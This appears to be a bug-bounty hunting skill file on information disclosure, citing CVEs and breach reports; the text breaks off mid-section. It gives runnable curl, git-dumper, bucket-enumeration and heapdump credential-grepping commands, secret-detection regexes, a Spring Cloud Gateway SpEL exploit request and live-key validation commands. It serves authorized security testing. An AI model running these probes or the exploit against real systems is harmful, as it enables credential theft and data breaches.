---
name: hunt-info-disclosure
description: Hunting skill for Information Disclosure / Sensitive Data Exposure (CWE-200 / CWE-209 / CWE-215 / CWE-538 / CWE-668 / CWE-798). Built from 106 corpus reports plus 8K shared-platform reports across HackerOne, Bugcrowd, Huntr, GitHub Security Advisories, plus 2024-2026 meta verified against NVD — Spring Boot Actuator family (CVE-2025-41253 SpEL info-disclosure CVSS 7.5, CVE-2025-41243 Spring Cloud Gateway property modification CVSS 10.0, CVE-2025-22235 EndpointRequest.to wrong matcher CVSS 7.3, CVE-2025-8525 Exrick xboot, CVE-2025-8738 microservices-platform), .git/.env mass exposure (Sysdig EmeraldWhale 15K cloud creds Oct 2024, Unit42 110K domain .env scan Aug 2024), Spring Boot Actuator heapdump → 9TB GPS data Volkswagen disclosure (Wiz Threat Research Dec 2024), debug endpoint family (Dgraph /debug/pprof GHSA-95mq-xwj4-r47p, MinIO LDAP brute-force GHSA-jv87-32hw-hh99, Glances /api/4/serverslist GHSA-r297-p3v4-wp8m, FUXA plaintext DB creds GHSA-c5gq-4h56-4mmx, Harbor default password GHSA-hj7x-hmf2-hc2p, NetBird VPN default admin GHSA-g3j4-58mp-3x25, PraisonAI WebSocket no-auth GHSA-cfh6-vr3j-qc3g, Gradio ACL bypass GHSA-j2jg-fq62-7c3h, Rancher cluster template credentials, ArgoCD Redis cache crypto), and the secrets-in-repo wave (GitGuardian 2026 State of Secrets: 28.65M new hardcoded secrets in 2025, GitHub 2024 secret-scanning report: 39M leaks). Use when hunting exposed credentials, leaked API keys, .git/.env files, debug endpoints, Spring actuator endpoints, S3 bucket misconfig, source-code disclosure, stack trace leakage, user/email enumeration, PII via API, server-side debug surfaces (phpinfo, /server-status), or any Confidentiality-impact-only finding.
sources: hackerone_public, github_advisories, github_deep, intigriti, huntr, bugcrowd, project_zero, microsoft_msrc, securitylab_github, nvd_verified, sysdig_threat_research, wiz_threat_research, gitguardian_research, trufflesecurity_research, palo_alto_unit42
report_count: 8298
generated_at: 2026-05-04
---

## Crown Jewel Targets

Information disclosure is the most-volume bug class in bug bounty (~30% of all disclosed reports across H1/Bugcrowd hacktivity), but the paying surface has shifted decisively toward **systemic credential exposure** rather than one-off PII leaks. Reflected stack traces on a 404 page are mid-three-figure or N/A on most programs; an exposed `/actuator/heapdump` containing AWS keys is mid-five-figure-class because it cascades to RCE on production cloud infrastructure. The 24-month meta crystallized around seven asset types. All CVEs below are NVD-verified.

**1. Spring Boot Actuator exposure (mid four-figure to mid five-figure when chained to cloud takeover).** Wiz Threat Research Dec 2024 analysis: **60% of cloud environments use Spring Boot Actuator, 11% expose instances publicly to the internet, 24% of exposed instances are misconfigured.** **Volkswagen 9TB GPS data disclosure** — single open `/actuator/heapdump` endpoint provided plaintext AWS keys via heap dump, attackers downloaded 9 TB of GPS data from hundreds of thousands of cars. Reference: https://www.syscrest.com/2025/02/securing-spring-boot-actuator/ (SYSCREST analysis Feb 2025), https://www.cyberkendra.com/2024/12/vulnerability-in-spring-boot-actuator.html (Wiz research summary Dec 2024). NVD-verified CVEs in the family:
- **CVE-2025-41243 Spring Cloud Gateway Server Webflux property modification (CVSS 10.0 CRITICAL)** — when actuator gateway endpoint exposed via `management.endpoints.web.exposure.include=gateway`, attackers modify Spring Environment properties remotely → potential RCE. Affects 4.3.x, 4.2.x, 4.1.x, 4.0.x, 3.1.x. Fix in 4.3.1 / 4.2.5 (OSS); 4.1.11 / 3.1.11 (Enterprise).
- **CVE-2025-41253 Spring Cloud Gateway info-disclosure (CVSS 7.5 HIGH)** — SpEL injection on actuator endpoint exposes environment variables and system properties (DB credentials, API keys, internal URLs).
- **CVE-2025-22235 Spring Boot EndpointRequest.to() wrong matcher (CVSS 7.3 HIGH)** — disabled actuator endpoint creates unprotected `/null/**` matcher path.
- **CVE-2025-8525 Exrick xboot Spring Boot Admin/Actuator info disclosure** (CVSS 5.5 MEDIUM).
- **CVE-2025-8738 zlt2000 microservices-platform actuator interface** (CVSS 5.5 MEDIUM).

The Wiz dashboard checklist for actuator endpoints: `/health` (low), `/prometheus` `/metrics` (medium), `/env` (HIGH — never expose), `/heapdump` (CRITICAL — never expose), `/beans` `/mappings` `/loggers` (high — internal/auth only), `/shutdown` (HIGH — disabled by default, never enable).

**2. `.git/` and `.env` mass exposure (mid four-figure direct + supply-chain cascades).** Two large 2024-2025 disclosures show this is industrialized:
- **Sysdig EmeraldWhale Oct 2024** — automated scanning of IP ranges for exposed `/.git/config` files. Stole **15,000 cloud credentials from 67,000 URLs** (28K Git repos, 6K GitHub tokens, 2K validated active credentials). Stored stolen secrets in 1TB S3 bucket. Reference: https://sysdig.com/blog/emeraldwhale, https://www.bleepingcomputer.com/news/security/hackers-steal-15-000-cloud-credentials-from-exposed-git-config-files/.
- **Unit42 (Palo Alto) Aug 2024** — large-scale .env extortion campaign scanned 110,000 domains, identified **90,000 unique combos of leaked env-vars including 7,000 active AWS access keys**. Targeted Mailgun-mentioning .env files for legitimate-domain phishing. Reference: https://unit42.paloaltonetworks.com/large-scale-cloud-extortion-operation.

Pattern: web servers serving Laravel, Symfony, Rails, Django apps mistakenly serve the application root including `.env` and `.git/`. Hunt with: `curl -s https://target/.env`, `curl -s https://target/.git/config`, `curl -s https://target/.git/HEAD`. Then `git-dumper https://target/.git/ /tmp/dumped` to recover the full repo.

**Disclosed bug bounty cases**: NASA `_x3ro_` Bugcrowd disclosure (Aug 2025, P3) — publicly accessible `.env` on NASA Bitbucket exposed UAT credentials for `cmr.sit.earthdata.nasa.gov`. Reference: https://redpacketsecurity.com/bugcrowd-bugbounty-disclosure-publicly-accessible-env-file-exposing-hardcoded-credentials-on-nasa-s-git-repository.

**3. Source-code repository secret leakage (CWE-798, low five-figure on triage-friendly programs).** **GitGuardian 2026 State of Secrets Sprawl**: 28.65M new hardcoded secrets added to public GitHub repos in 2025 (34% YoY increase). **GitHub's own 2024 secret-scanning report**: 39M secret leaks. **IEEE S&P 2025 academic study**: up to 30% of projects at risk. **Starbucks H1 #716292 (2019, Cremit reference)** — single leaked JumpCloud API key in public GitHub repo, classified CWE-798, **CVSS 9.7 critical**, paid bounty — proof that bug bounty programs CAN treat credential exposure as paying class. Reference: https://www.cremit.io/blog/out-of-scope-loophole-credential-exposure (Apr 2026 Cremit research on this exact pattern).

Hunt with **TruffleHog** (https://github.com/trufflesecurity/trufflehog, 26K+ stars, 800+ detectors, **active credential verification** against provider APIs to confirm still-live keys). Same pattern via **GitGuardian**, **Snyk Code SAST**, **GitHub Secret Scanning**. Caveat from Cremit Apr 2026 analysis: **most bug bounty programs still classify credential exposure as out-of-scope** — check program scope before reporting; many specifically EXCLUDE this finding class.

**4. Cloud-bucket misconfig (S3, GCS, Azure Blob — mid four-figure when PII counted; informational P5 when generic).** **ESHYFT March 2025** — 108GB / 86,341 healthcare-worker records (medical IDs, drivers licenses, SSNs, prescription records, disability claims) in unsecured S3 bucket; researcher Jeremiah Fowler discovered, took >1 month for org to close. Reference: https://www.theregister.com/2025/03/11/uber_for_nurses_exposes_86k/. **NASA Bugcrowd disclosure Feb 2025** — PDF in public S3 bucket (P5 informational only — NASA's VDP triages cloud-bucket findings strictly). Reference: https://bugcrowd.com/disclosures/aa45924f-8b67-4f22-8dff-dac7dc9d60e2/exposure-of-pdf-file-in-a-public-amazon-s3-bucket-associated-with-nasa.

Hunt with **`s3scanner`**, **`AWSBucketDump`**, subdomain enumeration → `<name>.s3.amazonaws.com`, `<name>.blob.core.windows.net`, `<name>.storage.googleapis.com`. The Wiz Cloud Security Index annual report tracks the most-common misconfig classes.

**5. Debug endpoint family (Spring actuator, Go pprof, Glances, FUXA, NetBird, Harbor — low four-figure to low five-figure depending on what's exposed).** All NVD-verified or GHSA-verified, all 2025-2026:
- **Dgraph `/debug/pprof/cmdline` (GHSA-95mq-xwj4-r47p)** — unauthenticated debug endpoint exposes full process command line including admin token from `--security "token=..."`. Critical.
- **Glances `/api/4/serverslist` (GHSA-r297-p3v4-wp8m, GHSA-gfc2-9qmw-w7vh)** — Central Browser mode REST API returns raw server objects with reusable downstream credentials; permissive CORS allows any origin.
- **FUXA plaintext DB credentials (GHSA-c5gq-4h56-4mmx)** — unauthenticated remote attacker retrieves administrative database credentials.
- **Harbor default password (GHSA-hj7x-hmf2-hc2p)** — GoHarbor v2.15.0 and below allows default password for web UI login.
- **NetBird VPN (GHSA-g3j4-58mp-3x25)** — installation script fails to remove ZITADEL-created default admin password.
- **MinIO LDAP brute-force (GHSA-jv87-32hw-hh99)** — `AssumeRoleWithLDAPIdentity` STS endpoint vulnerable to brute-forcing due to user enumeration + missing rate limit.
- **PraisonAI WebSocket Gateway (GHSA-cfh6-vr3j-qc3g)** — `/ws` and `/info` endpoints serve agent topology with no auth; any network client can connect, enumerate registered agents.
- **Gradio ACL bypass (GHSA-j2jg-fq62-7c3h)** — file path ACL bypassed via case alteration; lack of case normalization.
- **Rancher cluster template credentials in answers** — credentials not properly sanitized.
- **ArgoCD Redis cache risky/missing crypto** — credentials cached without proper encryption.
- **`/server-status`** Apache mod_status endpoint — H1 report 2473173 (2026 High) — exposed at `https://203.137.128.240/server-status` leaks request URLs, IPs, vhosts.

**6. PII exposure via API misconfiguration (CVSS-Confidentiality-only, low four-figure to low five-figure depending on record count).** Recent disclosed examples:
- **ASBS soldiers PII** (H1 2026 critical) — viewing other soldiers' Personnel Information / Board / Board Voters via the Army Body Score System.
- **`/talos/api/v1/files/upload` Critical Information Disclosure** (H1 report 3228011, 2025 critical).
- **IBM Aspera HTTP Gateway** (H1 report 3340797, 2026 high) — sensitive information stored in clear text in easily obtainable files.
- **ORDER_ERROR_LOG PII Data Exposure** (H1 2026 high) — error-log endpoint returns PII for any order ID.
- **Session Cookie Leakage via Static Header Field in WebViewerFragment** (H1 2026 high) — mobile WebView leaks session via static header.

Hunt: every API endpoint that returns user data, every error/log endpoint, every export feature, every `/me` and `/users/{id}` route.

**7. WordPress wp-config.php exposure (mid three-figure to mid four-figure; reliable VDP filler).** Multiple H1 reports 2026: report 3328408 (National Guard website), report 3252302. Pattern: `.bak`, `.old`, `~`, `.swp` backup files served alongside `wp-config.php` containing DB credentials. Hunt with: `curl https://target/wp-config.php{,.bak,.old,~,.swp}`. The BackupFinder ffuf wordlist covers the common variants.

**Memory disclosure (Heartbleed-class, when found pays mid five-figure).** **Dgraph `/debug/pprof/cmdline`** above. **`.NET Framework ObjRefs Disclosure (CVE-2024-29059)`** — H1 2026 high — .NET Remoting ObjRefs reveal internal endpoints. Modern memory-disclosure findings rare but high-impact when chained.

**Mobile / game / IoT disclosure** — **ASLR leak in Mario Kart World through LAN mode** (H1 2026 high). Mobile-app reverse-engineering finds API keys, internal URLs in compiled binaries. Game-engine memory disclosure via LAN/multiplayer protocols.

**What pays the most:** Spring actuator heapdump → cloud takeover (mid five-figure when chained — Volkswagen-class). Source-code repo with active AWS keys (low five-figure on programs that accept the class — Starbucks H1 #716292 precedent). Mass-PII via API misconfig (mid four-figure × record-count multiplier on healthcare/financial). `.env` exposure with active credentials (low four-figure direct + chain to AWS infrastructure for upgrade). `.git/` exposure (low four-figure direct + recover full repo + extract secrets). Generic stack trace, version banners, README leak — N/A on most programs.

## Attack Surface Signals

Greppable signals that this surface might exist:

```bash
# Spring Boot Actuator endpoints (CVE-2025-41243 family + Volkswagen pattern)
rg -n -e 'management\.endpoints\.web\.exposure\.include' \
   -e 'spring-boot-starter-actuator' \
   -g 'application*.{yml,yaml,properties}' -g '*.gradle' -g 'pom.xml'

# Spring actuator endpoints exposed in code
rg -n -e '@Endpoint' -e '@WebEndpoint' -e '@ReadOperation' --type java

# Hardcoded secrets / credentials in source
rg -n -e 'AKIA[0-9A-Z]{16}' \
   -e 'AIza[0-9A-Za-z_-]{35}' \
   -e 'sk_live_[0-9a-zA-Z]{24,}' \
   -e 'ghp_[0-9a-zA-Z]{36}' \
   -e 'github_pat_[0-9a-zA-Z]{82}' \
   -e 'xox[bpoa]-[0-9]{12}-[0-9]{12}-[0-9a-zA-Z]{24}' \
   -e 'eyJhbGciO[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+' \
   -g '!*.lock' -g '!node_modules' -g '!vendor'

# Database connection strings
rg -n -i -e 'jdbc:(?:mysql|postgresql|mariadb|oracle|mssql)://[^"\s]*:[^@\s]+@' \
   -e 'mongodb(\+srv)?://[^"\s]*:[^@\s]+@' \
   -e 'redis://[^"\s]*:[^@\s]+@' \
   -e 'amqp://[^"\s]*:[^@\s]+@'

# .env file references in code (suggest .env exists in deploy)
rg -n -e 'process\.env\.\w+' -e 'os\.environ\[' -e 'env\(\'?\w+\'?\)' \
   --type js --type ts --type py --type php

# Debug / pprof endpoints in Go code
rg -n -e 'net/http/pprof' -e '"/debug/pprof"' -e '_pprof' --type go

# Verbose error / debug mode in framework configs
rg -n -i -e 'debug\s*=\s*true' -e 'app_debug=true' \
   -e 'DEBUG\s*:\s*True' -e 'DJANGO_DEBUG=True' \
   -g '*.{yml,yaml,toml,ini,env,properties}'

# Stack-trace exposure in error handlers (Express/Flask)
rg -n -e 'app\.use\(function\(err' -e 'errorhandler\(' \
   -e '@app\.errorhandler' -e 'send.*error\.stack' \
   --type js --type ts --type py
```

HTTP-level signals on a live target:

- `Server: Tomcat`, `X-Application-Context:`, `Server: Jetty` + `/actuator/health` returns 200 → **Spring Boot Actuator surface** (probe `/actuator/heapdump`, `/actuator/env`, `/actuator/beans`)
- `Server: Apache` + Apache `mod_status` enabled → **`/server-status` info disclosure** (H1 report 2473173, 2026 High)
- `X-Powered-By: PHP/X.Y.Z` + `phpinfo()` reachable at common paths → **CVE-class info disclosure**
- `X-Powered-By: ASP.NET`, `.NET Remoting` enabled → **CVE-2024-29059 .NET Framework ObjRefs disclosure** family
- Subdomain returns Laravel default page → probe `https://target/.env` directly
- Any 200 OK on `https://target/.git/HEAD` or `https://target/.git/config` → **`.git/` exposure** (Sysdig EmeraldWhale class)
- `Vary: Accept-Encoding` + `text/html` response on `https://target/wp-config.php{,.bak,.old,~}` → **WordPress wp-config exposure** (H1 reports 3328408, 3252302, 2026 High)
- Open `<bucket>.s3.amazonaws.com`, `<bucket>.blob.core.windows.net`, `<storage>.googleapis.com` returns XML directory listing → **S3 / Azure / GCS bucket misconfig** (ESHYFT-class)
- `/api/v1/info`, `/api/4/serverslist`, `/info`, `/version`, `/build-info` returning verbose data → **Glances-class** (GHSA-r297-p3v4-wp8m)
- `/debug/pprof/cmdline` returns process command line including secrets → **Dgraph-class** (GHSA-95mq-xwj4-r47p)
- Login page returning different responses for valid vs invalid usernames → **user enumeration** surface (MinIO GHSA-jv87-32hw-hh99 LDAP variant)
- `/swagger.json`, `/api-docs`, `/openapi.json`, `/.well-known/openapi` exposed in production → **API documentation exposure**
- 500 error response includes full stack trace, file paths, framework version → **stack-trace info disclosure**
- `WWW-Authenticate: Basic realm="..."` exposing internal app names → **internal hostname disclosure**
- `Set-Cookie: <SESSION>=<value>; Domain=.target.com; Path=/` (no `Secure`, no `HttpOnly`) → **session-cookie leakage surface**

## Insertion Point Taxonomy

Every place sensitive content leaks for info-disclosure:

- **Source-code repos** (.git/.svn/.hg directories served by web server, public GitHub repos with embedded secrets, leaked private repo via dependency) — Sysdig EmeraldWhale 2024
- **Configuration files** (.env, wp-config.php, web.config, application.properties, settings.py, config.json) — Unit42 110K-domain scan 2024
- **Backup files** (.bak, .old, ~, .swp, .swo, .DS_Store, _bak, .backup, .copy) — manual fuzzing target
- **Debug / health / actuator endpoints** (/actuator/*, /debug/pprof/*, /api/health, /api/info, /api/build-info) — Wiz Threat Research 2024
- **Error pages / stack traces** (any 500 / 404 / unhandled exception) — framework-version + path disclosure
- **Server-status / management consoles** (/server-status, /server-info, /jenkins/script, /actuator/*) — multiple H1 2026 reports
- **Cloud storage buckets** (S3, GCS, Azure Blob, OSS, R2 — by name guessing or subdomain enum) — ESHYFT-class
- **API responses with verbose fields** (`/users/{id}` returning password_hash, internal_notes, role, tokens) — over-fetching pattern
- **Background-job logs** (Sidekiq, Celery, BullMQ admin UI exposing job arguments) — credential leakage in job params
- **Browser-side: JS bundles, Service Workers, source maps** (`.map` files, `__webpack_require__` exposing module names) — secrets in client-side
- **Mobile app binaries** (APK reverse-engineering, IPA Mach-O strings, embedded URLs and API keys)
- **Memory dumps** (heapdump, core dumps, profiler output, browser tab snapshots) — Volkswagen Spring actuator pattern
- **Process command lines** (/proc/PID/cmdline, /debug/pprof/cmdline, ps output) — Dgraph GHSA-95mq-xwj4-r47p
- **DNS records** (TXT records exposing internal service names, SPF records exposing service vendors, CNAME chains)
- **Headers** (Server, X-Powered-By, X-AspNet-Version, X-Framework, custom internal-name headers)
- **Email headers and bounces** (Received chains exposing internal mail server names, NDR responses leaking user existence)
- **Webhooks / callback URLs** (test webhook endpoints exposing internal service URLs in retry logs)
- **CORS preflight responses** (Access-Control-Allow-Origin reflecting attacker origin reveals trusted-origin allowlist)
- **Sitemap, robots.txt** (admin paths, dev environment URLs, staging hostnames)
- **Public-by-design APIs accidentally returning private fields** — over-fetching, GraphQL field-level (cross-references hunt-idor and hunt-xss)
- **Enumeration endpoints** — different responses for existing vs non-existing user/email/UUID enable username harvesting (MinIO LDAP GHSA-jv87-32hw-hh99 pattern)
- **Cache headers leaking auth state** (`X-Cache: HIT` / `Vary` mismatches reveal authenticated content cached publicly)

For each surface, send: `curl -sI https://target/<path>` (header inspection), `curl -s https://target/<path> | head -100` (body inspection), `curl -s -X POST -H "Content-Type: application/json" -d '{}' https://target/<endpoint>` (error elicitation), and run `nuclei -t exposures/` against the host for the canonical exposure templates.

## Step-by-Step Hunting Methodology

1. **Subdomain enumeration first.** `subfinder + amass + chaos + crt.sh` → every subdomain. Each is a candidate for `.git/`, `.env`, `/actuator/`, `/server-status`. The exposed-config attack surface scales linearly with subdomain count; legacy / dev / staging subdomains are the highest-yield targets.

2. **Run nuclei `exposures/` template set on every subdomain.** `nuclei -t http/exposures/` covers `.git/HEAD`, `.env`, `/server-status`, `/actuator/*`, `/swagger.json`, `/.well-known/`, `/phpinfo`, hundreds more. Single command, ~30 seconds per host. The H1 2026 wp-config disclosures (reports 3328408, 3252302) and `/server-status` disclosure (2473173) are all canonical nuclei-template hits.

3. **Spring Boot Actuator deep-probe.** If host responds with `Server:` containing Tomcat/Jetty/Undertow OR `X-Application-Context:` header OR `/actuator/health` returns 200 — probe the full endpoint set with priority ordering: `/actuator/heapdump` (CRITICAL — full memory dump), `/actuator/env` (HIGH — env vars), `/actuator/configprops`, `/actuator/beans`, `/actuator/threaddump`, `/actuator/mappings`, `/actuator/loggers`, `/actuator/gateway/routes` (CVE-2025-41243). For `/actuator/heapdump`, download the binary, analyze with Eclipse Memory Analyzer (MAT) or `strings | grep -E 'AKIA|AIza|sk_live|ghp_'` for secret patterns.

4. **`.env` and `.git/` direct probe on every subdomain.** `curl -s https://target/.env` and `curl -s https://target/.git/HEAD`. If 200 OK with content, run `git-dumper https://target/.git/ /tmp/dumped` to recover the entire repo. Then `trufflehog filesystem /tmp/dumped --only-verified` to extract live credentials.

5. **`wp-config.php` and backup-file fuzzing.** Use `ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-files.txt -u https://target/FUZZ -mc 200`. Append common backup extensions: `wp-config.php{,.bak,.old,~,.swp,.swo,.copy,.backup}`. The H1 2026 wp-config reports came from this exact technique against forgotten subdomains.

6. **Source-code repo secret scanning.** For OSS targets and any program with GitHub presence in scope: `trufflehog github --org=<org> --only-verified` (uses 800+ detectors with active credential validation). Cross-check with `gitleaks` on cloned repos. Reference TruffleHog: https://github.com/trufflesecurity/trufflehog. Caveat: most bug bounty programs classify credential exposure as out-of-scope; check program policy first (see Cremit Apr 2026 analysis at https://www.cremit.io/blog/out-of-scope-loophole-credential-exposure).

7. **Cloud bucket discovery.** From subdomain list, derive bucket-name candidates: `<subdomain>`, `<subdomain>-prod`, `<subdomain>-staging`, `<subdomain>-backup`, `<subdomain>-logs`, `<subdomain>-data`. Test each against `https://<name>.s3.amazonaws.com`, `https://<name>.blob.core.windows.net`, `https://storage.googleapis.com/<name>`. Use `s3scanner` or `AWSBucketDump` for automation. ESHYFT-class findings come from this exact enumeration on healthcare/financial targets.

8. **Debug endpoint family.** For Go services: `/debug/pprof/cmdline` (Dgraph GHSA-95mq-xwj4-r47p — exposes admin token in process args). For Spring: actuator family above. For Glances/Prometheus/Grafana monitoring: `/api/4/serverslist` (GHSA-r297-p3v4-wp8m), `/metrics`, `/prometheus`, `/dashboards/api/`. For Kubernetes: `/healthz/secret`, `/api/v1/secrets` against kubelet anonymous-auth misconfigs.

9. **API over-fetching audit.** For every authenticated API endpoint, request the data and inspect response. Look for fields that shouldn't be there: `password_hash`, `password_salt`, `tokens[]`, `api_keys[]`, `internal_notes`, `admin_comments`, `kyc_documents`, `mfa_secrets`, `recovery_codes`. The over-fetch pattern is mid four-figure on most programs.

10. **User / email enumeration.** Compare login response (timing, body, status) for known-existing vs non-existing username. Same for password reset, registration ("email already in use" vs "verification sent"). MinIO GHSA-jv87-32hw-hh99 (LDAP brute-force via enumeration + missing rate limit) is the canonical 2026 case. Document the timing delta or response delta.

11. **Stack trace / debug page elicitation.** Send malformed requests to every endpoint: `'`, `null`, `[]`, `{"a":}`, large bodies, missing required fields, content-type mismatches. Watch for 500 responses with full stack traces, file paths, framework versions, DB type. These are mid three-figure direct unless they reveal something materially sensitive (DB connection string, internal IP, framework + version → CVE replay candidate).

12. **Mobile app reverse engineering.** Pull APK with `apktool d <apk>` or IPA with `ipsw`. Run `strings <binary> | grep -iE '(api[_-]?key|secret|token|password|bearer|aws_access_key)'`. Inspect `assets/`, `res/raw/`, `META-INF/` for plaintext config. Mobile-app secret leaks are mid four-figure on iOS/Android program scope.

13. **Validate before reporting.** Demonstrable impact: count the records (PII), validate the credential is live (`aws sts get-caller-identity` for AWS keys; `curl https://api.github.com/user -H "Authorization: token <ghp>"` for GitHub tokens), show the exfil path. Don't dump the whole bucket — three records is enough proof. See Gate 0.

## Payload & Detection Patterns

### Sub-technique A — `.env` and config-file direct probe

```bash
# Direct .env probe
curl -s -o /dev/null -w "%{http_code}\n" https://target/.env
curl -s https://target/.env | head -50

# Common variants — try each
for path in .env .env.local .env.production .env.development \
           .env.bak .env.old .env~ .env.example .env.sample \
           env .environment app.env config.env; do
  curl -s -o /dev/null -w "%{http_code} %s\n" $path https://target/$path
done

# Laravel-specific (Unit42 Aug 2024 attack pattern)
curl -s https://target/.env | grep -E '^(APP_KEY|DB_PASSWORD|MAIL_PASSWORD|AWS_ACCESS_KEY|AWS_SECRET|MAILGUN)'

# Symfony / NextJS variants
curl -s https://target/.env.local
curl -s https://target/.next/server/.env

# WordPress wp-config (H1 2026 reports 3328408, 3252302)
for ext in '' .bak .old '~' .swp .swo .copy .backup; do
  curl -s -o /dev/null -w "%{http_code} %s\n" "wp-config.php$ext" "https://target/wp-config.php$ext"
done
```

### Sub-technique B — `.git/` directory exposure (Sysdig EmeraldWhale 2024 pattern)

```bash
# Detect exposed .git
curl -s https://target/.git/HEAD
curl -s https://target/.git/config
curl -s https://target/.git/index | head -c 100  # binary index

# Recover full repo using git-dumper
pip install git-dumper
git-dumper https://target/.git/ /tmp/dumped-target

# Inspect for secrets in commit history
cd /tmp/dumped-target
git log --all --oneline
git log --all -p -S 'AKIA' -- '*'        # find AWS keys ever committed
git log --all -p -S 'password' -- '*'    # find password mentions
git log --all -p -S 'sk_live' -- '*'     # find Stripe live keys
git log --all -p -S 'ghp_' -- '*'        # find GitHub PATs

# TruffleHog pass for systematic secret extraction (live verification)
trufflehog filesystem /tmp/dumped-target --only-verified --json > /tmp/secrets.json

# Reference: https://sysdig.com/blog/emeraldwhale (Sysdig Threat Research Oct 2024)
# 15K cloud creds stolen from 67K URLs via this exact pattern
```

### Sub-technique C — Spring Boot Actuator exploitation

```bash
# Detect actuator presence
curl -s https://target/actuator | jq .
curl -s https://target/actuator/health
# Response with "_links" object → actuator exposed

# CRITICAL endpoints — heap dump (Volkswagen pattern)
curl -s -o heapdump.bin https://target/actuator/heapdump
strings heapdump.bin | grep -E 'AKIA[0-9A-Z]{16}' | head -20  # AWS keys
strings heapdump.bin | grep -E 'AIza[0-9A-Za-z_-]{35}' | head -20  # Google API
strings heapdump.bin | grep -E 'sk_live_[0-9a-zA-Z]{24,}' | head -20  # Stripe
strings heapdump.bin | grep -E 'jdbc:[a-z]+://[^@]+@' | head -20  # DB URIs
# Or load in Eclipse Memory Analyzer (MAT) for proper analysis

# HIGH endpoints
curl -s https://target/actuator/env | jq .
curl -s https://target/actuator/configprops | jq .
curl -s https://target/actuator/beans | jq '.contexts.application.beans | keys'
curl -s https://target/actuator/threaddump
curl -s https://target/actuator/mappings
curl -s https://target/actuator/loggers

# CVE-2025-41243 Spring Cloud Gateway property modification (CVSS 10.0)
# Trigger condition: management.endpoints.web.exposure.include=gateway
curl -s https://target/actuator/gateway/routes
# If 200 with route list — vulnerable
# Exploit: POST a new route with SpEL that reads/modifies env properties
curl -X POST https://target/actuator/gateway/routes/exploit \
  -H 'Content-Type: application/json' \
  -d '{"id":"exploit","predicates":[{"name":"Path","args":{"_genkey_0":"/exploit"}}],"filters":[{"name":"AddResponseHeader","args":{"name":"X-Out","value":"#{T(java.lang.System).getenv()}"}}],"uri":"http://localhost"}'
curl -X POST https://target/actuator/gateway/refresh
curl -i https://target/exploit  # X-Out header now leaks env

# CVE-2025-41253 Spring Cloud Gateway info disclosure (CVSS 7.5)
# SpEL injection via actuator endpoint
# (Verbatim payload restricted in vendor advisory; see https://spring.io/security/cve-2025-41253)

# CVE-2025-22235 Spring Boot EndpointRequest.to wrong matcher (CVSS 7.3)
# Probe /null/** path when actuator endpoints disabled but EndpointRequest.to() used
curl -s https://target/null/

# Reference: https://www.syscrest.com/2025/02/securing-spring-boot-actuator/ (Volkswagen analysis)
# Reference: https://www.cyberkendra.com/2024/12/vulnerability-in-spring-boot-actuator.html (Wiz Dec 2024)
```

### Sub-technique D — Cloud bucket misconfig (S3/GCS/Azure)

```bash
# AWS S3 — check public listing
aws s3 ls s3://<target-bucket-name> --no-sign-request
curl -s https://<bucket-name>.s3.amazonaws.com/
# XML response with <ListBucketResult> → public listing enabled

# Get specific file (when listing disabled but read enabled)
aws s3 cp s3://<bucket>/secret.txt /dev/stdout --no-sign-request

# Discovery via subdomain enumeration (ESHYFT-class, Mar 2025)
# For each subdomain, try as bucket name
for sub in $(cat subdomains.txt); do
  for suffix in '' '-prod' '-staging' '-backup' '-logs' '-data' '-uploads'; do
    curl -s -o /dev/null -w "%{http_code} %s\n" "$sub$suffix" \
      "https://$sub$suffix.s3.amazonaws.com/"
  done
done

# Google Cloud Storage
curl -s https://storage.googleapis.com/<bucket-name>/
gsutil ls gs://<bucket-name>

# Azure Blob
curl -s "https://<account>.blob.core.windows.net/<container>?restype=container&comp=list"

# AWSBucketDump for systematic enum
git clone https://github.com/jordanpotti/AWSBucketDump
python AWSBucketDump.py -l buckets.txt -g grep_patterns.txt -D
```

### Sub-technique E — Source-code secret scanning (TruffleHog pattern)

```bash
# Scan a GitHub org for verified secrets
trufflehog github --org=target-org --only-verified --json > secrets.json

# Scan single repo with full git history
trufflehog github --repo=https://github.com/target/repo --only-verified --json

# Scan a local clone (faster)
git clone --mirror https://github.com/target/repo /tmp/repo.git
trufflehog filesystem /tmp/repo.git --only-verified

# Scan S3 bucket contents
trufflehog s3 --bucket=<bucket-name>

# Scan Docker image
trufflehog docker --image=<image-name>

# Common manual regex patterns (what TruffleHog detects with API verification)
# AWS access key
grep -rE 'AKIA[0-9A-Z]{16}' .
# AWS secret (40 chars b64-ish)
grep -rE '[A-Za-z0-9/+=]{40}' . | grep -i -E 'aws_secret|secret_key|secretAccessKey'
# Google API key
grep -rE 'AIza[0-9A-Za-z_-]{35}' .
# Slack token
grep -rE 'xox[bpoa]-[0-9]{12}-[0-9]{12}-[0-9a-zA-Z]{24}' .
# Stripe live key
grep -rE 'sk_live_[0-9a-zA-Z]{24,}' .
# GitHub Personal Access Token
grep -rE 'ghp_[0-9a-zA-Z]{36}' .
grep -rE 'github_pat_[0-9a-zA-Z]{82}' .
# JWT token
grep -rE 'eyJhbGciO[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+' .
# Private key
grep -rE '-----BEGIN (RSA|EC|OPENSSH|PRIVATE) (PRIVATE )?KEY-----' .

# Validate AWS key is live (don't pivot — just confirm)
AWS_ACCESS_KEY_ID=AKIA... AWS_SECRET_ACCESS_KEY=... \
  aws sts get-caller-identity

# Validate GitHub PAT is live
curl -s https://api.github.com/user -H "Authorization: token ghp_..."

# Reference: https://github.com/trufflesecurity/trufflehog
# Reference: https://snyk.io/articles/state-of-secrets/ (28.65M secrets in 2025 per GitGuardian)
```

### Sub-technique F — Debug / pprof / management endpoint family

```bash
# Go pprof — Dgraph pattern (GHSA-95mq-xwj4-r47p, 2026 critical)
curl -s https://target/debug/pprof/
curl -s https://target/debug/pprof/cmdline   # process command line — leaks --security="token=..."
curl -s https://target/debug/pprof/goroutine?debug=2  # goroutine stacks
curl -s https://target/debug/pprof/heap > heap.bin    # heap dump
go tool pprof -text heap.bin                          # analyze

# Glances /api/4/* family (GHSA-r297-p3v4-wp8m, GHSA-gfc2-9qmw-w7vh, GHSA-7p93-6934-f4q7, 2026 critical/high)
curl -s https://target:61208/api/4/serverslist     # leaks downstream credentials
curl -s https://target:61208/api/4/all             # full system info
curl -s https://target:61208/api/4/processlist     # running processes
# CORS bypass: even from attacker origin, Access-Control-Allow-Origin: * lets attacker exfil

# FUXA plaintext DB credentials (GHSA-c5gq-4h56-4mmx, 2026 critical)
